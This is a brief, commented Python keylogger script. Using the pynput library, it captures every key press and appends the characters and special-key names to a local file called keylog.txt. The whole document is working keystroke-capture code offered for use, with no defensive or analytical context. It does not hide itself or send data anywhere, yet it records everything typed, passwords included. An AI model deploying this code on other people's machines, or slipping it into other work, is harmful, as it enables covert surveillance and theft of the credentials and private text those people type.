# Importing the necessary module from the pynput library
#pip install pynput
from pynput.keyboard import Listener

# Define the function to be called whenever a key is pressed
def on_press(key):
    try:
        # Open the keylog.txt file in append mode
        with open("keylog.txt", "a") as log_file:
            # Write the character of the key pressed to the file
            log_file.write(f"{key.char}")
    except AttributeError:
        # If the key doesn't have a character attribute (e.g., special keys like Shift), write the key name
        with open("keylog.txt", "a") as log_file:
            log_file.write(f" {key} ")

# Main function to set up and start the key listener
def main():
    # Create a Listener object that calls on_press function whenever a key is pressed
    with Listener(on_press=on_press) as listener:
        # Start the listener
        listener.join()

# Check if this script is being run as the main program and call the main function
if __name__ == "__main__":
    main()
